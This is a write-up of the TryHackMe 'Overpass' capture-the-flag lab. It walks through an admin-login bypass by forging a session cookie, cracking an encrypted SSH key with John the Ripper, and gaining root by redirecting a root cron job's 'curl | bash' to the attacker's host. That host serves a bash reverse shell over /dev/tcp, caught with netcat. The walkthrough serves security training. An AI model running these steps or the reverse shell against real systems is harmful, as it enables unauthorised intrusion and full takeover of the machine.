+++
title = "Tryhackme Overpass"
date = "2020-01-12"
author = "0xm4g1c"
cover = ""
description = "Easy TryHackMe Challenge"
showFullContent = false
readingTime = true
+++

Initial Nmap scan shows 2 ports that are open (21-SSH and 80-HTTP):

```
Nmap 7.80 scan initiated Wed Dec  9 13:20:39 2020 as: nmap -A --script vuln -oN nmap.txt 10.10.34.125
Nmap scan report for 10.10.34.125
Host is up (0.85s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /admin.html: Possible admin folder
| http-jsonp-detection: 
| The following JSONP endpoints were detected: 
|_/main.js
|_http-passwd: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  9 13:33:56 2020 -- 1 IP address (1 host up) scanned in 797.64 seconds

```

Using gobuster, we discover a hidden /admin directory on the web server:

```
☺ curl -s http://10.10.34.125/admin/
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Overpass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/login.css">
    <link rel="icon" type="image/png" href="/img/overpass.png" />
    <script src="/main.js"></script>
    <script src="/login.js"></script>
    <script src="/cookie.js"></script>
</head>

<body onload="onLoad()">
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a class="current" href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <div class="content">
        <h1>Administrator area</h1>
        <p>Please log in to access this content</p>
        <div>
            <h3 class="formTitle">Overpass administrator login</h1>
        </div>
        <form id="loginForm">
            <div class="formElem"><label for="username">Username:</label><input id="username" name="username" r>
            <div class="formElem"><label for="password">Password:</label><input id="password" name="password"
                    type="password" required></div>
            <button>Login</button>
        </form>
        <div id="loginStatus"></div>
    </div>
</body>
</html>
```


```
// Content of login.js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Having a look at code we learn how users are authenticated. we can set a cookie with the key-value of SessionToken-'1'.

Using the web developer bar, we manually create this cookie and refresh the page. After refreshing we are provided with a SSH key. Let’s save it locally as ssh.key and give it the appropriate privileges. `chmod 600 ssh.key`

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

However, the key is password protected and we need to crack it:

```
☺ ssh -i ssh.key 10.10.34.125
load pubkey "ssh.key": invalid format
The authenticity of host '10.10.34.125 (10.10.34.125)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.34.125' (ECDSA) to the list of known hosts.
Enter passphrase for key 'ssh.key': 
```
Let’s crack it using John the Ripper:

1. change the file to a format familiar with `john` 
`☺ ssh2john.py ssh.key > ssh.hash`

2. crack `ssh.hash`
`☺ sudo john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt`

```
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
-------          (ssh.key)
1g 0:00:00:05 DONE (2020-08-19 16:47) 0.2000g/s 2868Kp/s 2868Kc/s 2868KC/sa6_123..*7¡Vamos!
Session completed. 
```

The password (------) is found. Let’s connect as james and get the user flag by logging in to SSH

```
☺ ssh -i ssh.key james@10.10.34.125
load pubkey "ssh.key": invalid format
Enter passphrase for key 'ssh.key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 19 14:48:09 UTC 2020

  System load:  0.15               Processes:           88
  Usage of /:   22.4% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.34.125
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ cat user.txt 

```

__Escalate your privileges and get the flag in root.txt__

Analyzing the crontab shows that there is a script executed by root every minute:

```
james@overpass-prod:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@overpass-prod:~$ 
```

The script is using curl to get the buildscript.sh from the local web server (overpass.thm --> 127.0.0.1 in /etc/hosts). Luckily, the /etc/hosts file is writable:

```
james@overpass-prod:~$ ls -l /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27 02:39 /etc/hosts
```

Let’s change the IP address from 127.0.0.1 to 10.4.22.30 (your IP) for the overpass.thm entry:

```
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.4.22.30 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, let’s create a local reverse shell that we will save in the location requested by the cron job:

1. make the file-path in your current directory  `downloads/src/buildscript.sh` and include the reverse shell 
   
    ```
    /bin/bash -i >& /dev/tcp/10.4.22.30/4444 0>&1
    ```

2. Start your local web server and wait for the cron job to get the content of the file (current directory):

    ```
    ☺ sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.34.125 - - [19/Aug/2020 17:06:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
    ```

3. In another window, we have a netcat listener running, after a while the cronjob gets executed and a reverse shell initiated:
   
    ```
    ☺ nc -nlvp 4444
    listening on [any] 4444 ...
    connect to [10.4.22.30] from (UNKNOWN) [10.10.34.125] 57212
    /bin/sh: 0: can't access tty; job control turned off
    # cd /root
    # ls
    buildStatus
    builds
    go
    root.txt
    src
    # cat root.txt
    ```
